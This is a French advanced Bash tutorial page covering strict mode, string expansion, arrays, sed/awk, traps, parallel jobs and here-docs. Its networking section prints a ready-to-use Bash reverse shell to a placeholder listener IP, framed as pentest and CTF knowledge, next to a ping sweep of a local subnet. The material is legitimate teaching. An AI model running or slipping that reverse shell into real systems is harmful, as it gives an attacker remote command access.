---
id: 02-bash-avance
title: Bash - Avancé
sidebar_position: 2
---

# Bash — Avancé

Ce cours suppose que les bases (pipes, redirections, variables, boucles) sont acquises. On passe à ce qui rend un script Bash **robuste, sûr et exploitable en production ou en pentest**.

## set -euo pipefail : le mode strict

À mettre en tête de **tous** tes scripts sérieux. C'est ce qui transforme Bash d'un langage laxiste (qui continue malgré les erreurs) en un langage qui s'arrête net quand quelque chose cloche.

```bash
set -euo pipefail
```

Décortiquons :

- **`set -e`** (errexit) — Le script s'arrête dès qu'une commande échoue (code de retour ≠ 0). Sans ça, un script continue après une erreur et peut faire n'importe quoi. Exemple du danger : `cd /repertoire/inexistant; rm -rf *` — si le `cd` échoue sans `-e`, le `rm -rf *` s'exécute dans le répertoire courant. Catastrophe.
- **`set -u`** (nounset) — Erreur si on utilise une variable non définie. Attrape les fautes de frappe dans les noms de variables et évite qu'un `rm -rf "$DOSSIER/"` avec `$DOSSIER` vide ne devienne `rm -rf /`.
- **`set -o pipefail`** — Dans un pipe, le code de retour est celui de la **première commande qui échoue**, pas de la dernière. Sans ça, `commande_qui_echoue | tee log` renvoie succès (car `tee` réussit), masquant l'erreur.

Complément utile pour déboguer : `set -x` affiche chaque commande avant de l'exécuter (trace). À activer/désactiver autour d'une zone problématique.

Un piège de `set -e` : certaines commandes « échouent » légitimement (un `grep` qui ne trouve rien renvoie 1). Neutralise-les explicitement : `grep motif fichier || true`.

## La manipulation de chaînes (parameter expansion)

Bash a des opérateurs intégrés pour manipuler les variables sans appeler `sed`/`awk`. C'est plus rapide et plus lisible :

```bash
chemin="/var/log/apache/access.log"

echo "${chemin##*/}"     # access.log      (basename : enlève le + long préfixe */)
echo "${chemin%/*}"      # /var/log/apache (dirname : enlève le + court suffixe /*)
echo "${chemin##*.}"     # log             (l'extension)
echo "${chemin%.*}"      # /var/log/apache/access (sans l'extension)

fichier="rapport_2024.txt"
echo "${fichier/2024/2025}"   # rapport_2025.txt   (remplacement 1re occurrence)
echo "${fichier//o/0}"        # rapp0rt_2024.txt   (// = toutes les occurrences)

# Valeurs par défaut (très utile avec set -u)
port="${PORT:-8080}"          # utilise $PORT si défini, sinon 8080
config="${CONFIG:?erreur : CONFIG doit être défini}"  # échoue avec message si vide

# Longueur et sous-chaînes
chaine="abcdefgh"
echo "${#chaine}"        # 8 (longueur)
echo "${chaine:2:3}"     # cde (à partir de l'index 2, 3 caractères)
```

Les valeurs par défaut `${VAR:-defaut}` et obligatoires `${VAR:?message}` sont particulièrement précieuses avec `set -u` pour gérer proprement les variables d'environnement optionnelles/requises.

## Les tableaux

Bash gère les tableaux indexés et associatifs (dictionnaires) :

```bash
# Tableau indexé
hosts=("192.168.1.1" "192.168.1.10" "10.0.0.1")
echo "${hosts[0]}"        # 192.168.1.1
echo "${hosts[@]}"        # tous les éléments
echo "${#hosts[@]}"       # nombre d'éléments (3)

for h in "${hosts[@]}"; do   # les guillemets + [@] = itération sûre
    echo "Scan de $h"
done

# Tableau associatif (dictionnaire) — déclaration obligatoire avec -A
declare -A services
services[ssh]=22
services[http]=80
services[https]=443

for nom in "${!services[@]}"; do    # ${!...} = les clés
    echo "$nom -> ${services[$nom]}"
done
```

Le `"${tableau[@]}"` avec guillemets et `@` est la forme correcte pour itérer sans casser sur les espaces. Les tableaux associatifs sont parfaits pour mapper des noms de service à des ports, des IP à des hostnames, etc.

## Traitement de texte avancé : sed et awk

Bash seul ne suffit pas pour le texte complexe. Ses deux compagnons indispensables :

**sed** — éditeur de flux, pour les substitutions et transformations ligne par ligne :

```bash
sed 's/ancien/nouveau/g' fichier          # remplace partout
sed -i 's/DEBUG/INFO/g' config.conf       # -i = modifie le fichier en place
sed -n '10,20p' fichier                   # affiche les lignes 10 à 20
sed '/^#/d' config.conf                    # supprime les lignes de commentaire
sed '/^$/d' fichier                        # supprime les lignes vides
```

**awk** — un vrai mini-langage pour le texte structuré en colonnes. Indispensable en analyse de logs :

```bash
# Afficher la 1re et la 7e colonne
awk '{print $1, $7}' access.log

# Somme des octets transférés (colonne 10 d'un log Apache)
awk '{sum += $10} END {print "Total :", sum, "octets"}' access.log

# Filtrer : uniquement les requêtes avec code HTTP 404
awk '$9 == 404 {print $7}' access.log | sort | uniq -c | sort -rn

# Changer le séparateur de champ (fichier /etc/passwd, séparé par :)
awk -F: '{print $1, $7}' /etc/passwd       # utilisateur et son shell
awk -F: '$3 >= 1000 {print $1}' /etc/passwd  # utilisateurs "humains" (UID >= 1000)
```

`awk` avec `$3 >= 1000` sur `/etc/passwd` pour lister les vrais utilisateurs, c'est un réflexe d'audit système. Apprends `awk` progressivement : c'est un investissement énorme en analyse.

## Traps : nettoyer proprement

Un `trap` exécute du code quand le script reçoit un signal ou se termine. Essentiel pour nettoyer les fichiers temporaires, même en cas d'interruption :

```bash
#!/usr/bin/env bash
set -euo pipefail

# Créer un dossier temporaire sûr
tmpdir=$(mktemp -d)

# Le nettoyer QUOI QU'IL ARRIVE (fin normale, erreur, Ctrl+C)
cleanup() {
    rm -rf "$tmpdir"
    echo "Nettoyage effectué"
}
trap cleanup EXIT

# ... travail dans $tmpdir ...
# Le trap se déclenche automatiquement à la sortie
```

`trap cleanup EXIT` garantit que le nettoyage a lieu à la fin, même si le script plante ou est interrompu par Ctrl+C. Combine-le avec `mktemp -d` (qui crée un dossier temporaire avec un nom unique et non prédictible) pour éviter les race conditions et les collisions de fichiers temporaires — un vrai enjeu de sécurité (les fichiers temporaires prévisibles sont une classe de vulnérabilité).

## Parallélisme et jobs

Pour accélérer les tâches réseau (scans, requêtes), le parallélisme change tout :

```bash
# Lancer en arrière-plan avec & puis attendre la fin de tous
for ip in 192.168.1.{1..254}; do
    (ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip up") &
done
wait    # attend la fin de tous les jobs en arrière-plan

# Mieux : limiter le nombre de jobs parallèles avec xargs
seq 1 254 | xargs -P 50 -I {} sh -c 'ping -c1 -W1 192.168.1.{} &>/dev/null && echo 192.168.1.{} up'
```

Le `xargs -P 50` lance 50 processus en parallèle — bien plus contrôlable qu'un `&` sauvage qui forkerait 254 processus d'un coup. Pour du parallélisme sérieux, l'outil `GNU parallel` va encore plus loin.

## Networking en Bash pur

Bash peut ouvrir des connexions TCP/UDP via les pseudo-fichiers `/dev/tcp/host/port` et `/dev/udp/...`. C'est précieux quand tu es sur une machine minimale sans `nc`, `nmap` ni Python :

```bash
# Test de port sans netcat
if timeout 2 bash -c "echo >/dev/tcp/192.168.1.1/22" 2>/dev/null; then
    echo "Port 22 ouvert"
fi

# Récupérer une page web sans curl ni wget
exec 3<>/dev/tcp/example.com/80
echo -e "GET / HTTP/1.0\r\nHost: example.com\r\n\r" >&3
cat <&3
exec 3>&-
```

Ce mécanisme est aussi la base du fameux **reverse shell Bash**, une des techniques les plus utilisées en pentest quand on a une exécution de commande sur une cible :

```bash
# Reverse shell : la cible se connecte à TON écouteur (nc -lvnp 4444)
bash -i >& /dev/tcp/TON_IP/4444 0>&1
```

À connaître absolument côté offensif (pour l'utiliser) comme défensif (pour le détecter dans les logs et le bloquer). C'est exactement le genre de payload que tu croises en CTF et en pentest.

## Here-documents et here-strings

Pour passer des blocs de texte multi-lignes :

```bash
# Here-document : bloc de texte en entrée
cat > /etc/monapp/config.conf <<EOF
server = ${SERVER_IP}
port = ${PORT}
debug = false
EOF

# Avec 'EOF' entre quotes : PAS d'interprétation des variables (texte brut)
cat > script.py <<'EOF'
print("$HOME n'est pas interprété ici")
EOF

# Here-string : passer une chaîne en stdin
grep "motif" <<< "$variable_multiligne"
```

Les here-docs sont parfaits pour générer des fichiers de config ou injecter des scripts. Attention au détail `EOF` vs `'EOF'` : avec quotes, les variables ne sont pas substituées (utile pour écrire du code qui contient des `$`).

## Débogage et bonnes pratiques

Quelques réflexes qui font la différence :

**ShellCheck** — l'outil indispensable. C'est un linter qui détecte les erreurs de quoting, les variables non citées, les pièges classiques. Installe-le et passe tous tes scripts dedans :

```bash
shellcheck mon_script.sh
```

Il t'apprendra le bon Bash mieux que n'importe quel tutoriel, en pointant tes erreurs réelles.

**Débogage** — `bash -x script.sh` pour tracer l'exécution, ou `set -x` / `set +x` autour d'une zone suspecte.

**Portabilité** — si ton script doit tourner sur des systèmes variés (Alpine dans un conteneur, un routeur, un système minimal), sache que `sh` (POSIX) n'est pas `bash`. Beaucoup des fonctionnalités de ce cours (tableaux, `[[ ]]`, `/dev/tcp`) sont des bashismes absents de `sh` pur (dash, busybox). Pour un script portable strict, teste avec `dash`.

## Ce qu'il faut retenir

- `set -euo pipefail` en tête de chaque script : arrêt sur erreur, variables non définies interdites, échecs de pipe détectés.
- La **parameter expansion** (`${var##*/}`, `${var/old/new}`, `${var:-defaut}`) manipule les chaînes sans outil externe.
- **awk et sed** sont indispensables pour le traitement de texte et l'analyse de logs — `awk -F:` sur `/etc/passwd`, filtrage par colonne, sommes.
- Les **traps** (`trap cleanup EXIT` + `mktemp -d`) garantissent un nettoyage propre et sûr.
- Le **parallélisme** (`xargs -P`, `&` + `wait`) accélère massivement les tâches réseau.
- `/dev/tcp/host/port` fait du réseau en Bash pur — base des tests de port et des **reverse shells** (à connaître en offensif et défensif).
- Passe **tout** ton code dans **ShellCheck** : c'est le meilleur professeur de Bash.
